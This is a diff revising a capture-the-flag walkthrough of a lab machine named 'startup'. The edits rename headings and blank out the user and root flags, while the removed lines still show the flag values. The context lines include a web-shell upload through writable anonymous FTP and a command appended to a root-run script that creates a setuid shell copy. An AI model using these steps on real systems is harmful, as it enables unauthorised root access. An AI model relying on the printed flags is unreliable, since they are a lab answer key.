@@ -8,7 +8,7 @@
 
 ## Enumeration
 
-- Nmap Initial
+### Nmap
 
 1. 21/ftp vsftpd 3.0.3
    - anonymous login allowed
@@ -48,9 +48,9 @@ $ ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/common.txt -e php,txt -c
 
 - it is same directory as ftp
 
-## Try User Access
+## User Access
 
-- FTP server's anonymous login, we have full access in ftp directory
+- FTP server's anonymous login, we have full access (read/write) in ftp directory
 - Let's try this
 
   - put php_shell.php file
@@ -86,7 +86,7 @@ Someone asked what our main ingredient to our spice soup is today. I figured I c
 
 ```sh
 lennie@startup:~$ cat /home/lennie/user.txt
-THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
+...
 
 
 lennie@startup:~/scripts$ cat planner.sh
@@ -107,7 +107,7 @@ lennie@startup:~/scripts$ ls -lah /etc/print.sh
 
 ```
 
-## Try Root Access
+## Root Access
 
 - planner.sh -> run by root, that lennie cannot write
 - in planner.sh, it calls /etc/print.sh, that lennie can write
@@ -137,7 +137,7 @@ echo "cp /etc/bash /tmp/bash; chmod +s /tmp/bash;" >> /etc/print.sh
 
 ```sh
 $ cat /root/root.txt
-THM{f963aaa6a430f210222158ae15c3d76d}
+...
 ```
 
 ---
